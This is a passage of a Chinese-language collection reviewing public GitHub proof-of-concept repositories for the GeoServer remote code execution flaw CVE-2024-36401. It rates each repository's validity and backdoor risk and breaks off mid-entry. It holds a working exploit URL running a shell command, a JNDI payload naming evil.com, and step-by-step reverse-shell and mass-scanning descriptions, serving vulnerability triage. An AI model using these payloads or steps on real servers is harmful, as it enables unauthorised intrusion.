## POC #2

**来源**: [CVE-2024-36401-Chocapikk_CVE-2024-36401.md](../2024/CVE-2024-36401-Chocapikk_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，可能导致完全系统控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 目标GeoServer实例运行在受影响的版本上，且允许网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞。该漏洞源于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库进行评估，从而允许未经身份验证的用户通过特制的OGC请求执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果（多个安全厂商已确认该漏洞被利用）和提供的漏洞利用代码，可以判定此漏洞是有效的，并且已经被积极利用。

**投毒风险：**
漏洞利用代码 `exploit.py` 主要是实现漏洞利用的功能，从代码结构和功能来看，投毒风险较低。主要功能是发送恶意请求，监听反弹shell。代码中也定义了一些参数，比如远程IP、远程端口、代理等等。代码比较清晰，逻辑简单。但是依然不能排除作者在某些不明显的代码中加入恶意代码的可能性，特别是代码涉及到网络请求和系统命令执行。因此，评估投毒风险为 10%。

**利用方式：**
1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求），其中包含特制的XPath表达式。这些请求会被GeoServer处理，并将属性名称传递给 commons-jxpath 库。
2.  **代码执行：** commons-jxpath 库在评估这些XPath表达式时，会执行攻击者注入的恶意代码。
3.  **反弹 Shell (POC中方式)：** 漏洞利用代码会启动一个监听器，然后在目标系统上执行命令以反弹 shell 到攻击者的机器上。  `exploit.py` 脚本允许攻击者指定目标 URL、攻击者 IP 地址和端口。通过命令行参数 `--url`, `--remote-ip`, 和 `--remote-port` 设置。
4.  **批量扫描:** 漏洞利用代码还支持批量扫描，通过 `--check <file_with_urls>` 指定包含URL列表的文件， `--threads <number_of_threads>`  指定线程数， `--output <output_file>` 指定输出文件。

**项目地址:** [Chocapikk/CVE-2024-36401](https://github.com/Chocapikk/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #3

**来源**: [CVE-2024-36401-Mr-xn_CVE-2024-36401.md](../2024/CVE-2024-36401-Mr-xn_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的用户可以通过构造的OGC请求执行任意代码

**影响版本:** 2.22.0 < version < 2.22.6, 2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** GeoServer服务可网络访问，并且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞。该漏洞源于GeoTools库API以不安全的方式将属性/属性名称传递给commons-jxpath库，从而允许执行任意代码。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute）来利用此漏洞，执行任意代码。

**有效性：**
提供的POC代码利用了`valueReference`参数执行任意命令，例如计算器程序。从漏洞描述和搜索引擎结果来看，POC是有效的，并且已被野外利用。

**投毒风险：**
查看提供的POC代码和LICENSE文件。LICENSE采用MIT许可，相对宽松。代码本身主要是提供了漏洞的利用方式，没有发现明显的恶意代码。README中包含绕过WAF的payload，以及各种请求方式（GetPropertyValue, GetFeature）的PoC。

*   LICENSE文件: MIT License, 比较通用，没有发现可疑之处
*   README文件：提供了漏洞的描述和多个PoC示例，没有直接执行恶意操作的代码。

综合来看，投毒风险较低，在10%左右。主要风险来自于对POC的滥用，而非POC本身包含恶意代码。

**利用方式：**
1.  确定目标GeoServer版本在受影响范围内。
2.  使用提供的PoC构造恶意OGC请求。
3.  利用`valueReference`参数或`PropertyName`，注入包含恶意代码的XPath表达式。
4.  发送构造的请求到目标GeoServer服务器。
5.  如果漏洞存在，服务器将执行注入的代码。

**项目地址:** [Mr-xn/CVE-2024-36401](https://github.com/Mr-xn/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #4

**来源**: [CVE-2024-36401-Niuwoo_CVE-2024-36401.md](../2024/CVE-2024-36401-Niuwoo_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的攻击者可以通过精心构造的输入来执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，以及 2.23.0 到 2.23.6，2.24.0 到 2.24.4，以及 2.25.0 到 2.25.2。

**利用条件:** 需要目标GeoServer实例存在于网络上并且可以访问 /geoserver/wfs 接口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，源于 GeoTools 库 API 对属性名称的处理不当。攻击者可以通过向 GeoServer 的 WFS 接口发送特制的 OGC 请求，利用 XPath 表达式注入来执行任意代码。此漏洞影响默认 GeoServer 安装，无需身份验证。

**漏洞分析：**

根据漏洞库信息和搜索引擎结果，该漏洞允许未经身份验证的攻击者通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求执行任意代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，从而允许执行任意 XPath 表达式。

**POC 代码分析：**

提供的 POC 代码是一个 Python 脚本，用于检测和利用 CVE-2024-36401 漏洞。该脚本包含以下功能：

*   `check_vuln(url)`: 发送一个包含恶意 payload 的 WFS GetPropertyValue 请求到目标 GeoServer 实例，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为目标存在漏洞。
*   `exploit_vuln(url, cmd)`:  发送一个包含恶意 payload 的 WFS GetPropertyValue 请求，其中 payload 包含要执行的命令。该函数通过 `java.lang.Runtime.getRuntime()` 来执行命令。同样，如果返回状态码为 400 并且响应内容包含 'ClassCastException'，则认为利用成功。
*   `multithreading(url_list, pools=5)`:  使用线程池对 URL 列表执行漏洞检测。
*   `init_config()`:  解析命令行参数，包括目标 URL、URL 列表和要执行的命令。

**有效性：**

POC 代码通过构造恶意的 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行任意代码。从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛确认和利用，并且POC代码的逻辑正确，所以判断提供的 POC 代码有效。

**投毒风险：**

分析 POC 代码后，没有发现明显的恶意代码或后门。POC 代码的功能是发送包含恶意 payload 的 HTTP 请求，从而利用漏洞执行命令。脚本中的 `exec(java.lang.Runtime.getRuntime(),"...")` 部分是利用漏洞的关键，但它本身并不是恶意代码，而是漏洞利用的一部分。作者将执行命令的权限交给了使用者,是否需要投毒取决于使用者。

**利用方式：**

1.  使用 `check_vuln(url)` 函数检测目标 GeoServer 实例是否存在漏洞。
2.  如果目标存在漏洞，使用 `exploit_vuln(url, cmd)` 函数执行任意命令。命令通过命令行参数 `-c` 传递。
3.  可以使用 `-f` 参数指定一个包含多个 URL 的文件，并使用 `multithreading(url_list,10)` 函数进行批量检测。

总的来说，该 POC 代码是有效的，并且没有发现投毒风险。它允许攻击者远程执行任意代码，对 GeoServer 实例构成严重威胁。

**项目地址:** [Niuwoo/CVE-2024-36401](https://github.com/Niuwoo/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #5

**来源**: [CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md](../2024/CVE-2024-36401-RevoltSecurities_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 受影响版本包括 2.22.6 之前，2.23.0 到 2.23.6 之间，2.24.0 到 2.24.4 之间，以及 2.25.0 到 2.25.2 之间的版本

**利用条件:** 目标GeoServer实例对外开放且运行于受影响的版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行(RCE)漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。未经身份验证的攻击者可以通过构造恶意的OGC请求参数（如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute requests）来利用此漏洞，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞已被积极利用。提供的POC代码仓库 `RevoltSecurities/CVE-2024-36401` 提供了一个用于检测和利用此漏洞的工具，包含docker-compose 文件用于搭建测试环境，以及 `exploit.py` 脚本用于漏洞利用，因此POC代码有效。

**投毒风险：**
*   `exploit.py` 文件中，脚本尝试与`https://api.cvssadvisor.com/ssrf/` 建立连接。这是一个潜在的风险点，因为攻击者可能通过控制该API来收集目标信息或进行其他恶意活动。但目前只是get请求实例信息，危害较小。但从代码的整体结构来看，投毒的风险较低。主要的功能还是针对`CVE-2024-36401`的利用。综上，认为投毒风险较低，约为10%。

**利用方式：**
1.  **确定目标GeoServer版本：** 确认目标GeoServer实例是否在受影响的版本范围内。
2.  **发送恶意OGC请求：** 构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。请求的Payload包含恶意的XPath表达式注入。
3.  **远程代码执行：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库，导致执行任意代码。
4.  **利用工具：** 使用提供的`exploit.py`脚本，指定目标URL，通过发送恶意请求触发漏洞。

简而言之，攻击者通过发送特制的OGC请求，利用GeoServer对属性名表达式的不安全评估，实现远程代码执行。

**项目地址:** [RevoltSecurities/CVE-2024-36401](https://github.com/RevoltSecurities/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #6

**来源**: [CVE-2024-36401-URJACK2025_CVE-2024-36401.md](../2024/CVE-2024-36401-URJACK2025_CVE-2024-36401.md)

## CVE-2024-36401 GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2

**利用条件:** GeoServer实例暴露在网络上，且运行在受影响版本范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，该漏洞源于GeoTools库在处理属性名称时，不安全地将其传递给commons-jxpath库进行XPath表达式的评估。由于此XPath评估被错误地应用于简单要素类型，因此影响了所有GeoServer实例。攻击者可以通过构造恶意的WFS、WMS或WPS请求，在未经身份验证的情况下，利用`valueReference`注入Java代码来执行任意系统命令。

**有效性：** 提供的PoC代码 `exp.py` 利用了此漏洞。它通过构造包含恶意代码的XML Payload，并将其发送到GeoServer的WFS接口 `/geoserver/wfs`，从而实现远程命令执行。PoC提供了两种利用模式：`cmd` 模式用于执行单条命令，`reverse` 模式用于建立反弹Shell连接。

**投毒风险：**  该PoC存在一定的投毒风险，虽然主要功能是利用漏洞，但攻击者可以利用PoC的灵活性嵌入恶意代码，例如下载并执行额外的恶意软件。反弹shell的bash命令和http请求等行为都有可能被恶意利用。风险预估为10%。

**利用方式：**
1.  **确定目标:**  确定运行着存在漏洞版本的GeoServer实例，并确认其网络可访问性。
2.  **构造Payload:** 使用PoC脚本 `exp.py`，选择 `cmd` 模式执行任意命令，或者选择 `reverse` 模式建立反弹Shell。
3.  **发送请求:**  PoC脚本会构造包含恶意Java代码的XML Payload，并通过POST请求发送到目标的WFS接口 `/geoserver/wfs`。
4.  **执行代码:**  如果漏洞存在，GeoServer会执行Payload中的恶意代码，从而实现远程命令执行。如果是反弹shell模式，需要在攻击者机器上监听指定端口，等待目标机器反弹shell连接。

**项目地址:** [URJACK2025/CVE-2024-36401](https://github.com/URJACK2025/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #7

**来源**: [CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md](../2024/CVE-2024-36401-XiaomingX_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，可能导致服务器完全控制

**影响版本:** 受影响版本：< 2.22.6, >= 2.23.0 且 < 2.23.6, >= 2.24.0 且 < 2.24.4, >= 2.25.0 且 < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的 OGC 请求参数执行远程代码。漏洞利用方式是通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求等多种方式。漏洞利用代码仓库中只包含 LICENSE 文件，并未发现任何可疑的投毒代码。

**项目地址:** [XiaomingX/cve-2024-36401-poc](https://github.com/XiaomingX/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #8

**来源**: [CVE-2024-36401-ahisec_geoserver-.md](../2024/CVE-2024-36401-ahisec_geoserver-.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许通过 WFS/WMS/WPS 接口进行网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的攻击者通过构造特制的OGC请求（例如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo 和 WPS Execute）来执行远程代码。漏洞根源在于 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，这使得攻击者可以在 XPath 表达式中注入恶意代码。提供的PoC代码展示了如何利用 `wfs:GetPropertyValue` 请求执行命令。它首先建议使用 `wfs:ListStoredQueries` 获取有效的 `wfs:ReturnFeatureType` 值，然后将其用于构建 `wfs:Query typeNames` 参数，以提高漏洞利用的准确性。示例payload包括了ping命令的执行和反弹shell的payload，以及内存马注入的payload。文章中提到的误判几率较高是因为直接使用 `sf:archsites` ，如果目标环境中不存在该feature type,则会报错。建议先获取可用的feature type名称。

**有效性：**
提供的PoC代码利用了漏洞描述中提到的攻击向量，并且参考了GitHub上的公开PoC（https://github.com/Mr-xn/CVE-2024-36401）。多个搜索结果表明该漏洞正在被积极利用（https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401，https://www.sonicwall.com/blog/geoserver-rce-vulnerability-cve-2024-36401-being-exploited-in-the-wild），表明该漏洞的利用是有效的。

**投毒风险：**
在提供的PoC代码中，没有发现明显的投毒代码。代码主要提供了漏洞利用的思路和示例payload，包括执行ping命令、反弹shell和注入内存马。反弹shell和内存马需要用户提供恶意代码，因此不存在作者隐藏的后门代码。因此，投毒风险评估为0%。

**利用方式：**
1.  **确定目标 GeoServer 版本：** 确认目标 GeoServer 版本在受影响的范围内。
2.  **获取有效的Feature Type：** 使用 `wfs:ListStoredQueries` 请求获取有效的 `<wfs:ReturnFeatureType>`值。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 `wfs:GetPropertyValue` 请求，其中 `wfs:Query typeNames` 参数使用从步骤2中获得的Feature Type.
4.  **发送请求：** 将构造的恶意请求发送到目标 GeoServer 的 WFS 接口。
5.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码。

**项目地址:** [ahisec/geoserver-](https://github.com/ahisec/geoserver-)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #9

**来源**: [CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md](../2024/CVE-2024-36401-amoy6228_CVE-2024-36401_Geoserver_RCE_POC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.22.0 < version < 2.22.6
2.23.0 <= version < 2.23.6
2.24.0 <= version < 2.24.4
2.25.0 <= version < 2.25.2

**利用条件:** 需要网络访问，目标服务器运行存在漏洞的 GeoServer 版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，源于 GeoTools 库 API 不安全地将属性名传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。漏洞存在于所有 GeoServer 实例中，可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**POC 有效性分析：**

提供的 POC 代码看起来是有效的。它包含以下关键功能：

*   使用 `requests` 库发送 HTTP 请求。
*   使用 `lxml` 库解析 XML 响应，提取 `Typenames`，并自动化的爬取所有Typenames信息，并循环测试可以利用的Typenames，修复Nuclei POC中由于Typenames写死，造成漏洞验证失败的问题。
*   支持 `-c` 参数执行命令，或使用 DNSLog 进行验证。
*   支持批量 URL 检测。

这些功能对应了漏洞的利用方式，即通过构造特定的 OGC 请求，利用 XPath 表达式注入执行任意命令。

**投毒风险分析：**

代码中存在轻微的投毒风险。风险点在于：

*   作者在代码中留下了版权声明，虽然这是正常的，但也增加了作者控制代码的风险。
*   虽然脚本本身的功能是漏洞利用，但如果作者恶意地修改了脚本，例如，在执行命令后添加额外的恶意操作，或者收集目标服务器的信息并发送给攻击者，那么就存在投毒风险。

综合考虑，投毒风险较低，约为 10%。此风险主要来自于作者是否会利用更新或维护代码的机会植入后门。

**利用方式总结：**

1.  **确定目标 GeoServer 版本：** 确认目标服务器运行的 GeoServer 版本在受影响范围内。
2.  **获取 Typenames：** 通过 WFS GetCapabilities 请求或其他方式获取目标 GeoServer 实例的 Typenames 信息。
3.  **构造恶意请求：** 构造包含恶意 XPath 表达式的 WFS/WMS/WPS 请求，将命令注入到 property/attribute name 中。
4.  **发送请求：** 将构造好的请求发送到目标 GeoServer 服务器。
5.  **验证漏洞：** 通过 DNSLog 或者检查命令执行结果验证漏洞是否存在。

例如，可以使用类似以下的 URL 构造恶意请求：

```
/geoserver/wfs?service=WFS&version=1.0.0&request=GetFeature&typeName=<typeName>&propertyName=fes:ResourceId&Filter=<%20fes:Filter%20xmlns:fes=%22http://www.opengis.net/fes/2.0%22%20xmlns:gml=%22http://www.opengis.net/gml/3.1.1%22%20xmlns:ogc=%22http://www.opengis.net/ogc%22><ogc:Function%20name=%22script:js%22><ogc:Literal><![CDATA[java.lang.Runtime.getRuntime().exec('touch /tmp/pwned');]]></ogc:Literal></ogc:Function></fes:Filter>
```

**项目地址:** [amoy6228/CVE-2024-36401_Geoserver_RCE_POC](https://github.com/amoy6228/CVE-2024-36401_Geoserver_RCE_POC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #10

**来源**: [CVE-2024-36401-bigb0x_CVE-2024-36401.md](../2024/CVE-2024-36401-bigb0x_CVE-2024-36401.md)

## CVE-2024-36401 - GeoServer 远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 需要目标GeoServer实例存在漏洞，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，源于GeoTools库API不安全地将属性名作为XPath表达式传递给commons-jxpath库。攻击者可以通过构造恶意的OGC请求（例如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo和WPS Execute）利用此漏洞，执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以确认该POC代码是有效的。搜索结果中多个来源（如Fortinet、Keysight、SonicWall、Rapid7等）都表明该漏洞已被实际利用。

**投毒风险：**
分析提供的POC代码后，发现存在一定的投毒风险。虽然代码的主要功能是利用漏洞执行反向shell，但在以下几个方面存在潜在的投毒可能性：

1.  **对 nc 命令的依赖：**  POC 依赖目标系统存在 `nc` (netcat) 命令。如果目标系统没有 `nc`，利用会失败。攻击者可能会修改 POC，尝试使用其他命令（如 `wget` 或 `curl`）下载并执行恶意脚本，从而实现更隐蔽或更复杂的攻击。
2.  **反向 Shell 的隐蔽性：**  反向 shell 连接通常会被防火墙或入侵检测系统拦截。攻击者可能会尝试使用加密或其他混淆技术来绕过这些安全措施。
3.  **日志记录和错误处理：**  POC 具有基本的日志记录功能，但可能不足以记录所有关键操作。攻击者可以修改代码，删除或篡改日志，以隐藏其活动。

总的来说，由于POC的目的是快速验证漏洞，相对比较简单，因此投毒的可能性相对较低，但仍然需要警惕。

**利用方式：**
该漏洞的利用方式主要通过以下步骤：

1.  **构建恶意OGC请求：** 攻击者构造包含恶意XPath表达式的OGC请求，例如WFS GetFeature请求。
2.  **发送恶意请求：** 攻击者将构造的恶意请求发送到目标GeoServer实例。
3.  **执行任意代码：** GeoServer在处理请求时，会将恶意XPath表达式传递给commons-jxpath库进行评估，从而导致任意代码执行。
4.  **反向Shell (POC使用):** POC 尝试建立反向 shell 连接，允许攻击者远程控制受感染的服务器。POC 发送一个POST请求，在请求中使用的payload来执行反向shell，连接到攻击者的机器。

**项目地址:** [bigb0x/CVE-2024-36401](https://github.com/bigb0x/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #11

**来源**: [CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md](../2024/CVE-2024-36401-bmth666_GeoServer-Tools-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 and < 2.23.6, >= 2.24.0 and < 2.24.4, >= 2.25.0 and < 2.25.2

**利用条件:** 默认 GeoServer 安装，网络可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称评估为 XPath 表达式，未经身份验证的用户可以通过构造特制的 OGC 请求参数来执行远程代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞利用已被证实有效，并且在野外已被利用。提供的漏洞利用代码（GeoServer-Tools）旨在简化利用过程，支持不同 JDK 版本的回显和内存马注入。

**投毒风险：**
查看了提供的POC代码，主要是一个GUI工具，利用了`woodpecker-requests`进行网络请求，`flatlaf`做界面美化。主要功能是发送payload到目标服务器，根据描述可以支持内存马注入，回显等功能。经过分析，该工具本身存在投毒的可能性较低。但考虑到代码审查的局限性，仍存在一定的风险，因此评估投毒风险为10%。这些风险可能包括：
  *   **非必要依赖：** 引入了不必要的依赖库，这些库可能包含未知的安全漏洞或被恶意利用。
  *   **后门代码：** 在工具中隐藏了后门代码，例如在内存马功能中，注入恶意代码。

**利用方式：**
1.  攻击者通过构造恶意的 OGC 请求（例如，WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute 请求）来触发漏洞。
2.  恶意请求包含特制的 XPath 表达式，这些表达式在评估属性名称时被 GeoServer 不安全地执行。
3.  通过执行恶意 XPath 表达式，攻击者可以在 GeoServer 服务器上执行任意代码。
4.  漏洞利用代码（GeoServer-Tools）提供了一个图形界面，允许攻击者指定目标 GeoServer 实例的 URL，选择不同的攻击载荷（如 DNSLog、命令回显、内存马注入），并发送恶意请求。

**总结：**
CVE-2024-36401 是一个严重的安全漏洞，允许未经身份验证的攻击者在 GeoServer 上执行任意代码。提供的漏洞利用代码简化了利用过程，但需要谨慎使用，并注意潜在的投毒风险。

**项目地址:** [bmth666/GeoServer-Tools-CVE-2024-36401](https://github.com/bmth666/GeoServer-Tools-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #12

**来源**: [CVE-2024-36401-cochaviz_cve-2024-36401-poc.md](../2024/CVE-2024-36401-cochaviz_cve-2024-36401-poc.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #13

**来源**: [CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-daniellowrie_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (< 2.22.6), 2.23.x (>= 2.23.0, < 2.23.6), 2.24.x (>= 2.24.0, < 2.24.4), 2.25.x (>= 2.25.0, < 2.25.2)

**利用条件:** 默认 GeoServer 安装，允许网络访问，且目标版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞。该漏洞源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，从而允许攻击者通过构造恶意的 XPath 表达式来执行任意代码。利用方式是通过构造恶意的 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求，在请求的参数中注入恶意代码。提供的 PoC 代码 `geopwn.py` 演示了如何通过 WFS GetPropertyValue 请求，利用`exec`函数执行系统命令。

**有效性：**  提供的PoC代码看起来有效。它利用了WFS服务的GetPropertyValue请求，并构造包含恶意代码的`valueReference`参数，利用`exec`函数执行命令。它首先生成一个反向shell的payload，然后通过wget下载到目标机器，赋予执行权限，并最终执行。

**投毒风险：**  PoC 代码本身主要功能是利用漏洞实现远程代码执行。但是，也存在一定的投毒风险：

*   **依赖下载：** PoC脚本会通过wget下载shell，脚本中使用的 URL (evilURL)  由用户提供，存在被替换为恶意文件的风险。
*   **msfvenom参数：**  PoC脚本直接调用msfvenom生成payload，如果攻击者修改msfvenom的参数，可以生成包含恶意功能的payload。

